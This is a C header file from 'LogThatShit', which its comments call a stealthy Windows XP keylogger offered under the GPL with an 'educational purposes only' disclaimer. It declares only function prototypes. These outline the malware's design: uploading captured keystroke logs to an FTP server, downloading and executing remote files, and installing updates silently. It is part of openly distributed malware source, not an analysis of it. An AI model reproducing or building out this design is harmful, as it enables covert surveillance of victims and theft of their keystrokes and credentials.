
// LogThatShit 
//		A stealthly keylogger designed on and for Windows XP 
//		By Isam M. <r0cket(NO_SPAM)jump@yahoo.com> 
//    http://biodegradablegeek.com

// This software file (the "File") is distributed under the terms of the 
// GNU General Public License Version 3, (the "License"). You may use, 
// redistribute and/or modify this File in accordance with the terms and 
// conditions of the License, a copy of which is available along with the 
// File in the license.txt file or by writing to 
//  Free Software Foundation, Inc., 
//  59 Temple Place, 
//  Suite 330, Boston, MA, 02111-1307 
//  
//  or on the Internet at http://www.gnu.org/licenses/gpl.txt.

// THE FILE IS DISTRIBUTED AS-IS, WITHOUT WARRANTY OF ANY KIND. THE AUTHOR 
// DOES NOT TAKE ANY RESPONSIBILITY FOR ANY DAMAGE OR LEGAL ISSUES YOU MAY 
// FACE WHEN USING THIS APPLICATION. PLEASE NOTE THAT LTS WAS WRITTEN AND 
// RELEASED FOR *EDUCATIONAL* PURPOSES ONLY AND IS NOT INTENDED TO BE USED 
// FOR ANYTHING THAT MAY BE AGAINST THE LAW WHERE YOU LIVE. IF YOU DO NOT 
// WANT THAT RESPONSIBILITY, PLEASE DONT COMPILE OR USE THIS APPLICATION.




#ifndef LTS_INJECTION_H_ 
#define LTS_INJECTION_H_ 

#include <wininet.h> 
#include "Common.h" 

char* GetBaseNameStart(char*); 
int strtoint(const char* const); 
HINTERNET OpenInternetSession(); 
HINTERNET ConnectToFtp(HINTERNET); 
int UploadFileToFtp(HINTERNET service, const char* const, const char* const); 
int DownloadAndExecuteFile(HINTERNET); 
int DownloadAndInstallUpdate(HINTERNET); 
DWORD WINAPI UploadLog(); 
int HandleSpecialFileNames(HINTERNET); 
void ArchiveLog(); 
void SetLogStatus(LogStatus); 
int GetSettings(); 
DWORD WINAPI main2(); 
char* SettingsGetValue(char*, unsigned int, const char* const); 

#endif 


